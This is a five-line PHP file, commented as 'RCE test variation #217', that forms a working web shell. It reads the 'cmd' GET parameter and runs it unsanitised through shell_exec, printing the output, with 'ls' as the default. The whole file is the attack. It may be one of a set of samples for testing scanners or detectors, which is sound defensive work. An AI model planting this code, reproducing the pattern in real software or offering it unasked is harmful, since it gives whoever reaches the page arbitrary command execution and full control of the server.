<?php
// RCE test variation #217
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>